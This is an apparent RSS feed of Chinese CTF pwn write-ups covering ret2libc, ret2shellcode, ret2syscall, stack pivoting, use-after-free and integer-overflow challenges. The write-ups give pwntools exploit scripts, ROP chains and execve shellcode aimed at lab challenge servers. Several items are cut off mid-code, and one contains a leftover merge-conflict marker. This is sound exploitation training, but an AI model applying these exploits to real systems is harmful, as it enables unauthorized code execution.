payload = &amp;#39;a&amp;#39; * 112 + system_addr + &amp;#39;b&amp;#39; * 4 + /bin/sh_addr #ret2libc1.pyfrom pwn import *p = remote(&amp;#34;10.0.25.109&amp;#34; , 10005)binsh_addr = 0x8048720system_addr = 0x08048460payload = flat([&amp;#39;a&amp;#39; * 112, system_addr, &amp;#39;b&amp;#39; * 4, binsh_addr])#注：因为system()函数在调用时，栈会向起传入4个字节当作system()函数的返回地址，所以构造4个b将其当作地址传给system()p.sendline(payload)p.interactive() </description>
    </item>
    
    <item>
      <title>ret2libc2_new</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc2_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc2_new/</guid>
      <description>首先使用checksec指令查看基本情况：
再放入ida进行查看：
可以看到并没有/bin/sh字符串，但是我们可以看到有gets函数和system函数
所以我们的思路就是两次利用gets函数，第一次利用gets对栈进行布置，第二次利用gets输入/bin/sh。
其中buf_addr是存放/bin/sh的地址，我们通过gdb中的vmmap指令可以查看哪一段代码是可写可读的：
所以我们将/bin/sh写在0x601000中
payload = b&amp;#39;a&amp;#39;*120 + p64(pop_rdi_ret) + p64(buf2_addr) + p64(gets_addr)payload += p64(pop_rdi_ret) + p64(buf2_addr) + p64(sys_addr) #ret2libc2_x64from pwn import*#p = process(&amp;#39;./ret2libc2&amp;#39;)p = remote(&amp;#39;10.0.25.109&amp;#39;,10006)if args.G:gdb.attach(p)pause()sys_addr = 0x400570gets_addr = 0x400580pop_rdi_ret = 0x400793pop_rsi = 0x400791buf2_addr = 0x601000context.log_level = &amp;#39;debug&amp;#39;payload = b&amp;#39;a&amp;#39;*120 + p64(pop_rdi_ret) + p64(buf2_addr) + p64(gets_addr)payload += p64(pop_rdi_ret) + p64(buf2_addr) + p64(sys_addr) p.</description>
    </item>
    
    <item>
      <title>ret2libc2_old</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc2_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc2_old/</guid>
      <description>首先查看基本信息：
开启了NX 保护，说明内存不可执行，但是对这道题来说，并不重要
拖入IDA中查看代码：
可以看到有gets函数。
到这里我们的思路就和ret2libc1的思路一样，找到溢出点，计算ret的偏移量，将ret指向system函数，再使用system函数运行/bin/sh。
随后我们查看文件中是否有system函数：
有system函数，然后查看是否有/bin/sh：
但我们在文件中，并没有找到/bin/sh。
我们现在找到了gets函数、system函数、但并没有找到/bin/sh。
这种情况我们就可以选择调用gets函数，将我们自己输入的/bin/sh存放到.bss段：
BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。可执行程序包括BSS段、数据段、代码段。 大概思路就是，我们先填充字符，填充掉第一次gets存放的地址，然后再让gets的返回值返回到gets函数开头，再次条用gets，这时输入shellcode，让gets将shellcode存放到.bss段，然后返回system函数，调用shellcode。
计算gets函数ret的偏移量
payload = flat([&amp;#34;a&amp;#34;*112,gets,system,buf2,buf2]) #ret2libc2from pwn import *p = remote(&amp;#34;10.0.25.109&amp;#34;,10006)sys_addr = 0x8048490gets_addr = 0x8048460buf2_addr = 0x804A080payload = flat([&amp;#34;a&amp;#34;*112,gets_addr,sys_addr,buf2_addr,buf2_addr])p.sendline(payload)p.sendline(&amp;#39;/bin/sh&amp;#39;)p.interactive() </description>
    </item>
    
    <item>
      <title>ret2libc3_new</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc3_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc3_new/</guid>
      <description>首先查看基本信息：
v1 大小为 0x70，ret 大小为 8，故 padding 为 0x78
然后查看/bin/sh 和 system：
并没有/bin/sh 和 system。
搜索 syscall 也没有找到
这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。
通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：
from pwn import *context.log_level = &amp;#39;debug&amp;#39;p = remote(&amp;#39;10.0.25.109&amp;#39;,10007)#p = process(&amp;#39;./ret2libc3&amp;#39;)if args.G:gdb.attach(p)pause()elf = ELF(&amp;#39;./ret2libc3&amp;#39;)main = 0x4006AEpop_rdi_ret = 0x400743puts_addr = 0x400695pop_rsi_r15_ret = 0x400741payload = b&amp;#39;a&amp;#39;*120+p64(pop_rdi_ret) + p64(elf.got[&amp;#39;puts&amp;#39;]) payload += p64(elf.</description>
    </item>
    
    <item>
      <title>ret2libc3_old</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2libc3_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2libc3_old/</guid>
      <description>首先查看文件基本属性：
看到文件并没有开启PIE，所以代码段的地址是相对固定的。
然后查看是否有system函数和/bin/sh
可以看到并没有system函数，也没有/bin/sh
搜索int 0x80也可以看到并没有：
没有int 0x80也不能调用execve函数
虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：
可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so
libc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。
那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。
现在我们使用puts函数举例：
​	当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。
所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：
payload = b&amp;#39;a&amp;#39;*(0x6c+4) //padding+p32(elf.plt[&amp;#39;puts&amp;#39;]) //使函数转跳到puts函数+p32(main)	//puts函数的返回值+p32(elf.got[&amp;#39;puts&amp;#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：
puts=u32(p.recv(4))	//将接收到的地址放入puts中print(&amp;#39;puts&amp;#39;,hex(puts))	libc =LibcSearcher(&amp;#39;puts&amp;#39;,puts)	//在libcsearcher中寻找puts函数的偏移量libcbase=puts-libc.dump(&amp;#39;puts&amp;#39;)	//计算基址system=libcbase+libc.dump(&amp;#39;system&amp;#39;)	//计算出system函数的真实地址bin_sh=libcbase+libc.dump(&amp;#39;str_bin_sh&amp;#39;)	///bin/sh的真实地址print(&amp;#39;system&amp;#39;,hex(system))print(&amp;#39;binsh&amp;#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法
因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：
payload2=b&amp;#39;a&amp;#39;*(0x64+4)+p32(system)+p32(0xdeadbeef)+p32(bin_sh) from pwn import *from LibcSearcher import *#context.log_level = &amp;#39;debug&amp;#39;p = remote(&amp;#39;10.0.25.109&amp;#39;,10007)#p = process(&amp;#39;./ret2libc3&amp;#39;)elf = ELF(&amp;#39;./ret2libc3&amp;#39;)main = 0x08048618if args.G:gdb.attach(p)payload = b&amp;#39;a&amp;#39;*(0x6c+4)+p32(elf.</description>
    </item>
    
    <item>
      <title>ret2resolve1</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2resolve1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2resolve1/</guid>
      <description>首先查看基本情况：
在IDA里我们可以看到main函数和产生溢出的函数：
我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。
那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。
首先我们需要泄露服务器端的函数地址：
from pwn import *context.log_level = &amp;#39;debug&amp;#39;p = remote(&amp;#39;10.0.25.109&amp;#39;,10009)elf = ELF(&amp;#39;ret2resolve&amp;#39;)#p = process(&amp;#39;./ret2resolve&amp;#39;)if args.G:gdb.attach(p)payload = 112 * b&amp;#39;a&amp;#39;payload += p32(elf.plt[&amp;#39;write&amp;#39;])payload += p32(elf.symbols[&amp;#39;main&amp;#39;])payload += p32(1)payload += p32(elf.got[&amp;#39;write&amp;#39;])payload += p32(4)payload += p32(elf.symbols[&amp;#39;main&amp;#39;])p.sendline(payload)write_addr = u32(p.recvuntil(&amp;#39;\xf7&amp;#39;)[-4:])#write_addr = u32(p.recv(4))print(&amp;#39;write_addr =&amp;#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：
可以看到，函数的后12位是460。
然后修改一下上面的脚本，我们可以输出一些其他的函数：
我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/
这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：
libcbase = write_addr - 0xd44d0system = libcbase + 0x3a950binsh = libcbase + 0x15912bpayload = 112 * b&amp;#39;a&amp;#39;payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)sh.</description>
    </item>
    
    <item>
      <title>ret2shellcode</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2shellcode/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2shellcode/</guid>
      <description>首先查看基本情况：
ida中也没有看到system和/bin/sh
可以看到栈可执行，我们需要判断是jmp rsp还是输入shellcode：
在IDA中我们可以看到read函数可以输入0x40个字符，但buf却只存取8个字符，所以我们有0x38个字符可以输入，这个长度我们可以使用shellcode
shellcode = &amp;#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#39; 又因为程序开启了PIE，我们需要计算shellcode的地址：
p.recvuntil(&amp;#39;[&amp;#39;) buf_addr = p.recvuntil(&amp;#39;]&amp;#39;,drop=True) 这样就可以计算出存放字符的起始地址
然后构造payload：
payload = flat([&amp;#39;a&amp;#39;*16,p64(int(buf_addr,16)+8+8+8),shellcode])//‘a’*16：填充字符&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD//p64(int(buf_addr,16)+8+8+8)：buf_addr的起始地址+read函数读取的8位+rbp的填充+shellcode的8位地址=======//p64(int(buf_addr,16)+8+8+8)：buf_addr的起始地址+read函数读取的8位+leave使用掉的8位+shellcode的8位地址//leave = mov esp,ebp;pop ebp&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; origin/dev #ret2shellcode_x64from pwn import *#p = process(&amp;#34;./ret2shellcode&amp;#34;)p = remote(&amp;#34;10.0.25.109&amp;#34;,10000)shellcode = &amp;#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#39;p.recvuntil(&amp;#39;:&amp;#39;)buf_addr = p.recvuntil(&amp;#39;\n&amp;#39;,drop=True)payload = flat([&amp;#39;a&amp;#39;*16,p64(int(buf_addr,16)+8+8+8),shellcode])p.sendline(payload)p.interactive() </description>
    </item>
    
    <item>
      <title>ret2syscall</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2syscall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2syscall/</guid>
      <description>注：因为32位和64位程序使用的汇编语言存在差异，使用此方法时请务必确认程序的位数。 首先先检查一下保护机制：
可以看到，没有开启栈溢出保护和随机地址。
那么我们可以考虑泄露函数地址，查找libc版本，但是使用file指令查看文件的编译信息，我们就会发现：
这个文件是开启了静态编译的。
文件是动态编译时，才会使用到libc。如果时静态编译，则会将所有需要的函数都放到文件内部。
我们使用IDA，就可以直观的感受到：
我们可以看到，在文件中有很多函数，并且函数的名称也被隐藏了的。
然后我们查看是否有/bin/sh字符：
通过查找，可以看到在程序中确实有/bin/sh字符串。
虽然这道题有很多函数看上去复杂，但是相应的，因为函数多，那么我们构建gadget也非常的方便 可以看到我们想要的gadget都有
这道题的思路就是：
通过调用号，调用exec函数（64位的调用号为0x3b，32位程序的调用号位0xb），然后构造gadget将/bin/sh输入进exec函数，最后让程序跳转到syscall指令（32位程序的调用号位int 0x80）。
#payload.pyfrom pwn import *#p=process(&amp;#34;./ret2syscall&amp;#34;)p = remote(&amp;#39;10.0.25.109&amp;#39;,10004)if args.G:gdb.attach(p)pop_eax_ret = 0x4005afpop_rdi_ret = 0x4006a6pop_rsi_ret = 0x4100f3pop_rdx_ret = 0x448ee5bin_addr = 0x492364syscall = 0x40126cpayload = flat([&amp;#39;a&amp;#39;*120,pop_eax_ret,&amp;#39;\x00&amp;#39;*4,0x3b,&amp;#39;\x00&amp;#39;*4,pop_rdi_ret,&amp;#39;\x00&amp;#39;*4,bin_addr,&amp;#39;\x00&amp;#39;*4,pop_rsi_ret,&amp;#39;\x00&amp;#39;*12,pop_rdx_ret,&amp;#39;\x00&amp;#39;*12,syscall])#payload = b&amp;#39;a&amp;#39;*120 + p64(pop_eax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_addr)#payload += p(pop_rsi_ret) + &amp;#39;\x00&amp;#39;*8 + p64(pop_rdx_ret) + &amp;#39;\x00&amp;#39;*8 + p64(syscall)p.</description>
    </item>
    
    <item>
      <title>ret2text</title>
      <link>https://jellyfish-pro.github.io/ctf/ret2text/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/ret2text/</guid>
      <description>拿到binary后首先查看基本信息：
发现是64位文件，然后使用checksec指令来查看程序的保护情况
发现这道题并没有栈保护和PIE，因为没有PIE，所以.text上的代码地址是固定的，在我们调用函数和构造gadget时就可以直接使用.text上的地址。
然后我们将binary放入IDA中：
我们可以清楚看到main函数，随后我们来到main函数可以看到其中有两个功能函数：
（两个功能函数已被我在IDA中重命名，目的是为了直观展示两个函数的作用）
随后我们跟如两个函数内部：
可以看到两个函数的功能，尤其是int hello ()函数中存在gets()函数，可以成为突破点。
可以看到v1字符串的大小为0x70字节，但是gets函数会读取用户输入直到遇到&amp;rsquo;\n&amp;rsquo;字符，能读取的字符串长度大于0x70字节，这将导致缓冲区溢出，由于变量v1储存在栈上，所以将导致栈溢出。
于是我们利用Linux自带的cyclic命令构建200个有序字符，因为是有序的字符串，所以我们可以通过任意四个字符来定位这四个字符在这字符串中的位置，从而计算出这四个字符前面有多少个字符：
然后在gdb中运行ret2text，使用r指令，gdb会在输入字符处停下来，等待输入。
我们输入刚刚的200个有序字符，回车后我们可以看到程序到了一个无法识别的地方：
这就证明，我们输入的字符串过多，get函数发生了溢出，多余的字符覆盖了原本的ret的值，导致ret将我们输入的参数当作返回地址了，于是我们使用cyclic自带的-l命令来计算输入了多少个字符：
这样我们就知道了，我们需要输入120个字符才能覆盖到ret。
上面因为我们输入的长度覆盖到了ret，导致ret返回到了奇怪的地方。既然ret可以返回到奇怪的地方，那就意味着ret可以返回到能够受我们控制的地方。
在IDA中我们可以看到这样一个函数：
这个函数调用了system函数并且参数是/bin/sh。
如果我们可以让上面说到的ret返回到这个函数上，那么我们就能运行这个函数。运行了system(/bin/sh)我们就能能进入linux shell。
所以我们构造payload，首先是使得gets溢出到ret的padding（填充），再在padding后面跟上这个函数的地址0x4006c7
那么最后我们的payload就是：
Payload=b”a”*120+p(0x4006C7) #ret2text.pyfrom pwn import *p=remote(&amp;#34;10.0.25.109&amp;#34;,10001) p.recvuntil(&amp;#34;?\n&amp;#34;) p.sendline(b&amp;#34;a&amp;#34;*120+p32(0x4006C7)) p.interactive() </description>
    </item>
    
    <item>
      <title>stackprivot</title>
      <link>https://jellyfish-pro.github.io/ctf/stackprivot/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/stackprivot/</guid>
      <description>注：本题需要使用shellcode，请务必保证使用的shellcode与程序的位数匹配。 查看基本信息：
这道题打开了栈可读可写可执行，那么下一步就查看是否有jmp_rsp指令：
有jmp rsp指令，那么这道题的思路就是将shellcode写入栈，然后利用jmp rsp运行到栈，再指向shellcode。
然后我们通过IDA查看一下padding大小和一些细节：
通过IDA我们可以了解到fgets函数会读取96个字符，而s只会储存48个字符，意思就是会有96-48=48个字符的溢出。
方法一： 我们可以将shellcode写入padding中，再利用pwntools的asm（）函数构造汇编指令，让程序运行到shellcode上。
栈的结构为：
#stackprivot_x64from pwn import *#p = process(&amp;#39;./stackprivot&amp;#39;)p = remote(&amp;#34;10.0.25.109&amp;#34;, 10002)shellcode = &amp;#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#34;if args.G:gdb.attach(p)sub_rsp_jmp = asm(&amp;#34;sub rsp, 0x40;jmp rsp&amp;#34;,arch = &amp;#39;amd64&amp;#39; )jmp_rsp = 0x40068bpayload = flat([shellcode.ljust(0x30, &amp;#34;A&amp;#34;), b&amp;#39;b&amp;#39;*8 , p64(jmp_rsp), sub_rsp_jmp])p.recvuntil(&amp;#34;?&amp;#34;)p.sendline(payload)p.interactive() 方法二： 我们知道会有48个字符溢出，而减去ret的8位地址，jmp_rsp的8位地址，接下来会有32个字符供我们操作，所以我们可以用一个32个字节以下的shellcode，放入栈中。
栈的结构为：
#stackprivot_x64from pwn import *#p = process(&amp;#39;./stackprivot&amp;#39;)p = remote(&amp;#34;10.0.25.109&amp;#34;, 10002)shellcode = &amp;#34;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#34;if args.</description>
    </item>
    
    <item>
      <title>stacksmashes</title>
      <link>https://jellyfish-pro.github.io/ctf/stacksmashes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/stacksmashes/</guid>
      <description>注：这道题需要在Ubuntu16.04的环境上运行。 首先使用checksec查看程序的基本情况：
可以看到这个，程序开启了canary（栈保护）。
当程序开启了banary后，当程序检测到溢出后会调用stack_chk_fail函数，这个函数就会输出报错信息：
可以看到，报错的信息是：字符串+程序名字+terminated
*** stack smashing detected ***: ./stacksmashes_old terminated 这里我们需要将程序放入IDA查看一下程序存储的字符串：
在字符串中我们可以看到，程序中是没有放入文件名字，那么我们可以猜测，报错信息中的文件名，是在程序的主函数加载之前就被载入栈中的。
通过stack_chk_fail函数的源码，我们就可以看出漏洞：
void __attribute__ ((noreturn)) __stack_chk_fail (void){__fortify_fail (&amp;#34;stack smashing detected&amp;#34;);}void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){/* The loop is added only to keep gcc happy. */while (1)__libc_message (2, &amp;#34;*** %s ***: %s terminated\n&amp;#34;,msg, __libc_argv[0] ?: &amp;#34;&amp;lt;unknown&amp;gt;&amp;#34;); } 在下面__libc_argv[0]这个指针所指的就是我们程序的名字，那么通过这个指针的偏移量，我们就可以打印出任意我们知道地址的字符串。
而这个漏洞在之后的更新中已经修复，故需要在ubuntu16.04上使用。
新版libc中__stack_chk_fail函数代码：
void__attribute__ ((noreturn))__stack_chk_fail (void){__fortify_fail_abort (false, &amp;#34;stack smashing detected&amp;#34;);}void__attribute__ ((noreturn))__fortify_fail_abort (_Bool need_backtrace, const char *msg){/* The loop is added only to keep gcc happy.</description>
    </item>
    
    <item>
      <title>Use_After_Free</title>
      <link>https://jellyfish-pro.github.io/ctf/use_after_free/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/use_after_free/</guid>
      <description>此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)
首先查看一下保护：
可以发现这居然是一个32位程序，并且没有开启pie
随后运行一下程序：
可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。
随后我们来到ida查看这些功能的细节：
在查看添加函数时，我们发现存在一个名为v0的结构体：
通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。
**注意：**这里的content也是通过malloc函数分配的空间。
随后我们看到删除函数：
可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件
结合刚刚程序的流程，我们可以得出一条利用方式：
首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块
**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。
当我们创建两个note后，我们需要将这两个note给删除。
这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：
但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。
这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。
那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。
最后数据就会变为这样：
可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。
如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。
同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。
#!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &amp;#39;debug&amp;#39;p = process(&amp;#39;./hacknote&amp;#39;)magic = 0x08048986p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;aaaa&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.send(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Note size :&amp;#39;)p.send(&amp;#39;16&amp;#39;)p.recvuntil(&amp;#39;Content :&amp;#39;)p.send(&amp;#39;bbbb&amp;#39;)p.recvuntil(&amp;#39;Your choice :&amp;#39;)p.</description>
    </item>
    
    <item>
      <title>鹏城杯_2018_note</title>
      <link>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/</guid>
      <description>鹏城杯_2018_note 鹏城杯_2018_note
写在前面： 目前的目标是强化分析漏洞点的能力，所以会重点书写漏洞的成因。
题目分析 我们先静态分析二进制文件：
其中，漏洞在于：
这里nptr只有10个字节，但却可以往nptr所在的地址写入15个字节
而根据上面栈的结构，就可以知道，这里多出来的5个字节就会覆盖到index的地址上，而index是用来寻找content地址的。
我们点击进content：
注意地址，是在bss段，我们往上拉就可以看到got表：
这里地址相差了：
也就意味着，我们如果可以将index覆盖成-64，我们就可以劫持got表中exit函数的地址
这时我们就需要查看一下汇编：
通过上面的注释，我们可以看到，如果想要将got表中的exit地址改为malloc函数分配的地址，我们需要将上面的-64除以8：
所以我们只需要将index覆盖成为0xFFFFFFF8，就可以劫持got表的exit函数
exp from pwn import *context(arch=&amp;#39;amd64&amp;#39;, os=&amp;#39;linux&amp;#39;, log_level=&amp;#39;debug&amp;#39;)file_name = &amp;#39;./2018_note&amp;#39;r = remote(&amp;#39;node4.buuoj.cn&amp;#39;, 29319)elf = ELF(file_name)def dbg():gdb.attach(r)def add(index, size, content):r.sendline(&amp;#39;1&amp;#39;)sleep(0.1)r.sendline(str(index))sleep(0.1)r.sendline(size)sleep(0.1)r.sendline(content)p1 = asm(&amp;#39;&amp;#39;&amp;#39;mov rsi, 0x0068732f6e69622fjmp $+0x16&amp;#39;&amp;#39;&amp;#39;)p2 = asm(&amp;#39;&amp;#39;&amp;#39;push rsimov rdi, rspjmp $+0x1c&amp;#39;&amp;#39;&amp;#39;)p3 = asm(&amp;#39;&amp;#39;&amp;#39;xor rax, raxmov al, 0x3bjmp $+0x1b&amp;#39;&amp;#39;&amp;#39;)p4 = asm(&amp;#39;&amp;#39;&amp;#39;xor rsi, rsixor rdx, rdxsyscall&amp;#39;&amp;#39;&amp;#39;)add(0, b&amp;#39;13&amp;#39;.</description>
    </item>
    
    <item>
      <title>鹏城杯_2018_overint</title>
      <link>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/</guid>
      <description>鹏城杯_2018_overint 题目：鹏城杯_2018_overint
写在前面： 目前阶段是想寻找并解决基础知识上的一些漏洞。所以文章的重点会放在理论和分析上，而对漏洞的利用则不会详细讲解。
漏洞分析： 其实这道题的漏洞已经写在题目上了，是整数溢出。
在题目中的体现便是：
这里变量int_long已经远远大于4，但变量int_v12是一个有符号的整型。
根据上图，有符号整型的正数部分最大到0x7fffffff。所以只要我们将int_v12+int_long的值大于0x7fffffff，那么计算机就会认为其为负数，从而使int_v12 &amp;gt; 4 为False
题目流程分析 程序首先调用了这个qmencpy函数，创造了一个内存空间用来存放我们输入的字符。这一段空间很重要，因为后面的漏洞利用我们会用到这段空间。
随后会让我们输入4个字符，并且将这个四个字符放入check_1函数进行检测：
因为只需要返回35，所以我们直接写个脚本，跑一下就好了：
#!/usr/bin/python3def check1():for i in range(100):for j in range(100):for k in range(100):for l in range(100):v3 = 0v3 = ((i &amp;gt;&amp;gt; 4) + 4 * v3) ^ (i &amp;lt;&amp;lt; 10)v3 = ((j &amp;gt;&amp;gt; 4) + 4 * v3) ^ (j &amp;lt;&amp;lt; 10)v3 = ((k &amp;gt;&amp;gt; 4) + 4 * v3) ^ (k &amp;lt;&amp;lt; 10)v3 = ((l &amp;gt;&amp;gt; 4) + 4 * v3) ^ (l &amp;lt;&amp;lt; 10)if v3 == 35 and i == 5:print(&amp;#39;[+] %d, %d, %d, %d&amp;#39; % (i, j, k, l))check1() 但需要注意的是，并不是所有的结果都可以使用。因为这个结果会和上面说到的int_long相加，故必须要大于0x5F9CCC8E(0x80000000-int_long)。</description>
    </item>
    
  </channel>
</rss>
